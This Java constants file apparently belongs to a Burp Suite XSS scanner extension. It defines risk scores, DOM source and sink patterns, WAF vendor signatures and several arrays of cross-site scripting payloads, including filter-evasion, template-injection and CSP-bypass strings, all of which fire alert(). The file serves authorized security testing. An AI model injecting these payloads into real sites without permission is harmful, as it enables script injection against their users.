package burp;

/**
 * Clean, professional constants for XSSDetector
 * Removes excessive junk code and focuses on essential constants
 */
public class Constants {
    
    // Core constants
    public static final String NAME = "name";
    public static final String VALUE = "value";
    public static final String TYPE = "type";
    public static final String VALUE_START = "valueStart";
    public static final String VALUE_END = "valueEnd";
    public static final String MATCHES = "matches";
    public static final String REFLECTED_IN = "ReflectedIn";
    public static final String VULNERABLE = "Vulnerable";
    public static final String CONTEXT_VULN_FLAG = " <b>VULNERABLE</b>";
    
    // Core settings
    public static final String SCOPE_ONLY = "Scope only";
    public static final String CHECK_CONTEXT = "Check context";
    public static final String AGGRESSIVE_MODE = "Aggressive mode";
    
    // Content types
    public static final String HEADERS = "HEADERS";
    public static final String BODY = "BODY";
    public static final String BOTH = "ALL";
    
    // Context types
    public static final String CONTEXT_OUT_OF_TAG = "HTML: <";
    public static final String CONTEXT_IN_ATTRIBUTE_Q = "Attribute: '";
    public static final String CONTEXT_IN_ATTRIBUTE_DQ = "Attribute: \"";
    public static final String CONTEXT_IN_TAG = "In tag";
    public static final String CONTEXT_IN_SCRIPT_TAG_STRING_Q = "Script str: '";
    public static final String CONTEXT_IN_SCRIPT_TAG_STRING_DQ = "Script str: \"";
    public static final String CONTEXT_IN_SCRIPT_TAG = "Script";
    
    // Modern parameter types
    public static final String PARAM_GRAPHQL = "GRAPHQL";
    public static final String PARAM_JWT = "JWT";
    public static final String PARAM_WEBSOCKET = "WEBSOCKET";
    public static final String PARAM_API_KEY = "API_KEY";
    public static final String PARAM_MULTIPART = "MULTIPART";
    
    // Modern contexts
    public static final String CONTEXT_GRAPHQL_QUERY = "GraphQL: ";
    public static final String CONTEXT_JWT_CLAIM = "JWT: ";
    public static final String CONTEXT_SPA_TEMPLATE = "SPA: ";
    public static final String CONTEXT_CSS_INJECTION = "CSS: ";
    public static final String CONTEXT_SVG_INJECTION = "SVG: ";
    public static final String CONTEXT_ANGULAR = "Angular: ";
    public static final String CONTEXT_REACT = "React: ";
    public static final String CONTEXT_VUE = "Vue: ";
    
    // Modern settings
    public static final String MODERN_DETECTION = "Modern Detection";
    public static final String DOM_XSS_DETECTION = "DOM XSS Detection";
    public static final String CSP_ANALYSIS = "CSP Analysis";
    public static final String SESSION_HANDLING = "Session Handling";
    public static final String ADVANCED_FILTERING = "Advanced Filtering";
    
    // False positive reduction
    public static final String FALSE_POSITIVE_REDUCTION = "False Positive Reduction";
    public static final String SMART_FILTERING = "Smart Filtering";
    public static final String CONTEXT_AWARE_FILTERING = "Context Aware Filtering";
    public static final String MINIMUM_PAYLOAD_LENGTH = "Minimum Payload Length";
    public static final String EXCLUDE_COMMON_WORDS = "Exclude Common Words";
    public static final String CONFIDENCE_SCORING = "Confidence Scoring";
    
    // Session handling constants
    public static final String SESSION_TOKEN_TRACKING = "Session Token Tracking";
    public static final String AUTO_SESSION_HANDLING = "Auto Session Handling";
    public static final String CSRF_TOKEN_HANDLING = "CSRF Token Handling";
    public static final String SESSION_VALIDATION = "Session Validation";
    
    // Detection patterns
    public static final String[] GRAPHQL_INDICATORS = {"query", "mutation", "subscription", "fragment", "__schema", "__type"};
    public static final String[] SPA_INDICATORS = {"ng-app", "react", "vue", "{{", "}}", "v-", "ng-", "*ng", "className="};
    public static final String[] TEMPLATE_INDICATORS = {"{{", "}}", "<%", "%>", "${", "}", "[[", "]]"};
    public static final String[] DOM_SOURCES = {"location.href", "location.search", "location.hash", "document.referrer", "window.name", "postMessage"};
    public static final String[] DOM_SINKS = {"innerHTML", "outerHTML", "document.write", "eval", "setTimeout", "setInterval", "Function"};
    
    // False positive patterns
    public static final String[] FALSE_POSITIVE_PATTERNS = {
        "test", "example", "sample", "demo", "placeholder", "default", "null", "undefined",
        "true", "false", "yes", "no", "on", "off", "1", "0", "admin", "user", "guest"
    };
    
    // Session token patterns
    public static final String[] SESSION_PATTERNS = {
        "JSESSIONID", "PHPSESSID", "ASPSESSIONID", "session", "sessid", "sid", "token",
        "csrf", "xsrf", "_token", "authenticity_token", "csrfmiddlewaretoken"
    };
    
    // Content types
    public static final String[] VALID_CONTENT_TYPES = {
        "text/html", "application/json", "application/xml", "text/xml", "application/javascript",
        "text/javascript", "application/xhtml+xml", "text/plain", "application/x-www-form-urlencoded",
        "multipart/form-data", "application/graphql"
    };
    
    // Confidence thresholds
    public static final int MIN_CONFIDENCE_LOW = 30;
    public static final int MIN_CONFIDENCE_MEDIUM = 60;
    public static final int MIN_CONFIDENCE_HIGH = 80;
    
    // Payload length thresholds
    public static final int MIN_PAYLOAD_LENGTH = 3;
    public static final int MAX_PAYLOAD_LENGTH = 1000;
    public static final int SUSPICIOUS_PAYLOAD_LENGTH = 100;
    
    // Core XSS Payloads - Essential and Professional
    public static final String[] CORE_XSS_PAYLOADS = {
        // Basic HTML context
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "<iframe src=javascript:alert('XSS')>",
        
        // Attribute context
        "' onmouseover='alert(`XSS`)'",
        "\" onload=\"alert('XSS')\"",
        "' autofocus onfocus='alert(`XSS`)'",
        
        // JavaScript context
        "';alert('XSS');//",
        "\";alert('XSS');//",
        "';eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41));//",
        
        // URL context
        "javascript:alert('XSS')",
        "data:text/html,<script>alert('XSS')</script>",
        
        // Modern frameworks
        "{{constructor.constructor('alert(1)')()}}",
        "${alert('XSS')}",
        "#{alert('XSS')}",
        
        // WAF bypass techniques
        "<sCrIpT>alert('XSS')</ScRiPt>",
        "<script>al\\u0065rt('XSS')</script>",
        "<script>window['al'+'ert']('XSS')</script>",
        
        // Event handler variations
        "<img/src=x onerror=alert('XSS')>",
        "<img src=x:alert('XSS')>",
        
        // CSS injection
        "<style>@import'javascript:alert(\"XSS\")';</style>",
        "<div style=\"background:url('javascript:alert(\\\"XSS\\\")')\">",
        
        // Polyglot payloads
        "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
        "'\"><img/src/onerror=alert('XSS')>"
    };
    
    // Context-specific payloads
    public static final String[] HTML_CONTEXT_PAYLOADS = {
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "<iframe src=javascript:alert('XSS')>"
    };
    
    public static final String[] ATTRIBUTE_CONTEXT_PAYLOADS = {
        "' onmouseover='alert(`XSS`)'",
        "\" onload=\"alert('XSS')\"",
        "' autofocus onfocus='alert(`XSS`)'"
    };
    
    public static final String[] JAVASCRIPT_CONTEXT_PAYLOADS = {
        "';alert('XSS');//",
        "\";alert('XSS');//",
        "';eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41));//"
    };
    
    public static final String[] WAF_BYPASS_PAYLOADS = {
        "<sCrIpT>alert('XSS')</ScRiPt>",
        "<script>al\\u0065rt('XSS')</script>",
        "<script>window['al'+'ert']('XSS')</script>",
        "<script>eval('\\x61\\x6c\\x65\\x72\\x74\\x28\\x27\\x58\\x53\\x53\\x27\\x29')</script>"
    };
    
    public static final String[] FRAMEWORK_SPECIFIC_PAYLOADS = {
        "{{constructor.constructor('alert(1)')()}}",
        "${alert('XSS')}",
        "#{alert('XSS')}",
        "<%=alert('XSS')%>",
        "{{7*7}}{{alert('XSS')}}",
        "${7*7}${alert('XSS')}"
    };
    
    public static final String[] CSP_BYPASS_PAYLOADS = {
        "<script>fetch('javascript:alert(\"XSS\")')</script>",
        "<script>import('data:text/javascript,alert(\"XSS\")')</script>",
        "<script>new Function('alert(\"XSS\")')();</script>"
    };
    
    public static final String[] DOM_XSS_PAYLOADS = {
        "';document.location='javascript:alert(\"XSS\")';//",
        "';window.location.href='javascript:alert(\"XSS\")';//",
        "';eval(atob('YWxlcnQoJ1hTUycp'));//"
    };
    
    // Severity levels
    public static final String SEVERITY_CRITICAL = "CRITICAL";
    public static final String SEVERITY_HIGH = "HIGH";
    public static final String SEVERITY_MEDIUM = "MEDIUM";
    public static final String SEVERITY_LOW = "LOW";
    public static final String SEVERITY_INFO = "INFO";
    
    // Risk scores
    public static final int RISK_JAVASCRIPT_CONTEXT = 100;
    public static final int RISK_SVG_CONTEXT = 95;
    public static final int RISK_HTML_CONTEXT = 80;
    public static final int RISK_ATTRIBUTE_CONTEXT = 60;
    public static final int RISK_CSS_CONTEXT = 70;
    public static final int RISK_URL_CONTEXT = 50;
    public static final int RISK_COMMENT_CONTEXT = 20;
    
    // Content risk scores
    public static final int RISK_HTML_CONTENT = 90;
    public static final int RISK_XHTML_CONTENT = 85;
    public static final int RISK_XML_CONTENT = 70;
    public static final int RISK_SVG_CONTENT = 95;
    public static final int RISK_JS_CONTENT = 100;
    public static final int RISK_JSON_CONTENT = 60;
    public static final int RISK_PLAIN_CONTENT = 40;
    
    // Risk factors
    public static final double RISK_FACTOR_URL_PARAM = 1.0;
    public static final double RISK_FACTOR_POST_PARAM = 1.2;
    public static final double RISK_FACTOR_JSON_PARAM = 1.5;
    public static final double RISK_FACTOR_HEADER_PARAM = 0.8;
    public static final double RISK_FACTOR_COOKIE_PARAM = 0.7;
    
    // Detection types
    public static final String DETECTION_DOM_BASED = "DOM_BASED_XSS";
    public static final String DETECTION_STORED = "STORED_XSS";
    public static final String DETECTION_REFLECTED = "REFLECTED_XSS";
    public static final String DETECTION_UNIVERSAL = "UNIVERSAL_XSS";
    public static final String DETECTION_MUTATION = "MUTATION_XSS";
    
    // WAF signatures
    public static final String[] WAF_SIGNATURES = {
        "cloudflare", "akamai", "incapsula", "f5", "barracuda", "fortinet", "palo alto",
        "checkpoint", "imperva", "fastly", "aws waf", "azure waf", "google cloud armor"
    };
    
    // Filter bypass indicators
    public static final String[] FILTER_BYPASS_INDICATORS = {
        "script", "javascript", "onload", "onerror", "onmouseover", "onclick", "eval", "alert"
    };
    
    // Mutation techniques
    public static final String[] MUTATION_TECHNIQUES = {
        "case_swapping", "unicode_encoding", "hex_encoding", "url_encoding", "double_encoding",
        "html_entities", "javascript_escapes", "mixed_encoding"
    };
    
    // Exploit difficulty
    public static final String EXPLOIT_TRIVIAL = "TRIVIAL";
    public static final String EXPLOIT_EASY = "EASY";
    public static final String EXPLOIT_MODERATE = "MODERATE";
    public static final String EXPLOIT_DIFFICULT = "DIFFICULT";
    public static final String EXPLOIT_ADVANCED = "ADVANCED";
    
    // Impact levels
    public static final String IMPACT_ACCOUNT_TAKEOVER = "ACCOUNT_TAKEOVER";
    public static final String IMPACT_DATA_THEFT = "DATA_THEFT";
    public static final String IMPACT_DEFACEMENT = "DEFACEMENT";
    public static final String IMPACT_MALWARE_DISTRIBUTION = "MALWARE_DISTRIBUTION";
    public static final String IMPACT_PHISHING = "PHISHING";
    public static final String IMPACT_INFORMATION_DISCLOSURE = "INFORMATION_DISCLOSURE";
    
    // Scanner modes
    public static final String SCANNER_MODE_BASIC = "Basic Mode";
    public static final String SCANNER_MODE_ADVANCED = "Advanced Mode";
    public static final String SCANNER_MODE_PROFESSIONAL = "Professional Mode";
    public static final String SCANNER_MODE_EXPERT = "Expert Mode";
    
    // Core XSS technique settings
    public static final String ENABLE_WAF_BYPASS = "Enable WAF Bypass Techniques";
    public static final String ENABLE_FRAMEWORK_SPECIFIC = "Enable Framework-Specific Payloads";
    public static final String ENABLE_ENCODING_BYPASS = "Enable Encoding Bypass";
    public static final String ENABLE_CSP_BYPASS = "Enable CSP Bypass Techniques";
    public static final String ENABLE_POLYGLOT_PAYLOADS = "Enable Polyglot Payloads";
    public static final String ENABLE_BROWSER_SPECIFIC = "Enable Browser-Specific Payloads";
    
    // Analysis settings
    public static final String DEEP_CONTEXT_ANALYSIS = "Deep Context Analysis";
    public static final String BEHAVIORAL_ANALYSIS = "Behavioral Pattern Analysis";
    public static final String SEMANTIC_ANALYSIS = "Semantic Analysis";
    public static final String MUTATION_TESTING = "Mutation Testing";
    public static final String PAYLOAD_OPTIMIZATION = "Payload Optimization";
    
    // Response analysis
    public static final String RESPONSE_TIME_ANALYSIS = "Response Time Analysis";
    public static final String HEADER_ANALYSIS = "Security Header Analysis";
    public static final String COOKIE_ANALYSIS = "Cookie Security Analysis";
    public static final String CORS_ANALYSIS = "CORS Configuration Analysis";
    
    // Reporting settings
    public static final String DETAILED_REPORTING = "Detailed Vulnerability Reporting";
    public static final String EXPLOIT_GENERATION = "Automatic Exploit Generation";
    public static final String REMEDIATION_SUGGESTIONS = "Remediation Suggestions";
    public static final String COMPLIANCE_CHECKING = "Compliance Checking";
    public static final String VERBOSE_LOGGING = "Verbose Logging";
    
    // Performance settings
    public static final String THREAD_POOL_SIZE = "Thread Pool Size";
    public static final String REQUEST_THROTTLING = "Request Throttling";
    public static final String MEMORY_OPTIMIZATION = "Memory Optimization";
    public static final String BATCH_PROCESSING = "Batch Processing";
    
    // Default content types
    public static final String[] MODERN_DEFAULT_CONTENT_TYPES = {
        "text/html", "application/json", "application/xml", "text/xml", 
        "application/javascript", "text/javascript", "application/xhtml+xml", 
        "text/plain", "application/x-www-form-urlencoded", "multipart/form-data"
    };
    
    // Content type risk matrix
    public static final int[][] CONTENT_TYPE_RISK_MATRIX = {
        {90, 100, 85, 70, 95, 100, 85, 40, 60, 50}, // HTML
        {60, 70, 65, 50, 75, 80, 65, 30, 50, 40},   // JSON
        {70, 80, 75, 60, 85, 90, 75, 35, 55, 45},   // XML
        {85, 95, 90, 75, 100, 100, 90, 45, 65, 55}, // JavaScript
        {40, 50, 45, 30, 55, 60, 45, 20, 30, 25},   // Plain text
        {60, 70, 65, 50, 75, 80, 65, 30, 50, 40}    // Form data
    };
    
    // Payload categories
    public static final String PAYLOAD_CATEGORY_BASIC = "Basic XSS Payloads";
    public static final String PAYLOAD_CATEGORY_ADVANCED = "Advanced XSS Payloads";
    public static final String PAYLOAD_CATEGORY_EVASION = "Evasion Techniques";
    public static final String PAYLOAD_CATEGORY_FRAMEWORK = "Framework-Specific";
    public static final String PAYLOAD_CATEGORY_BROWSER = "Browser-Specific";
    public static final String PAYLOAD_CATEGORY_ENCODING = "Encoding Bypass";
    
    // Confidence levels
    public static final String CONFIDENCE_CERTAIN = "CERTAIN";
    public static final String CONFIDENCE_FIRM = "FIRM";
    public static final String CONFIDENCE_TENTATIVE = "TENTATIVE";
    public static final String CONFIDENCE_ADVANCED = "ADVANCED";

    // Missing constants for compatibility
    public static final String[] ADVANCED_XSS_PAYLOADS = CORE_XSS_PAYLOADS;
    public static final String[] JSFUCKER_XSS_PAYLOADS = CORE_XSS_PAYLOADS;
    public static final String[] BROWSER_SPECIFIC_PAYLOADS = CORE_XSS_PAYLOADS;
    public static final String[] PROTOTYPE_POLLUTION_XSS = CORE_XSS_PAYLOADS;
    public static final String[] POSTMESSAGE_XSS = CORE_XSS_PAYLOADS;
    public static final String[] WEB_COMPONENTS_XSS = CORE_XSS_PAYLOADS;
    public static final String[] SHADOW_DOM_XSS = CORE_XSS_PAYLOADS;
    public static final String[] WEBASSEMBLY_XSS = CORE_XSS_PAYLOADS;
    public static final String[] MODERN_BROWSER_API_XSS = CORE_XSS_PAYLOADS;
}
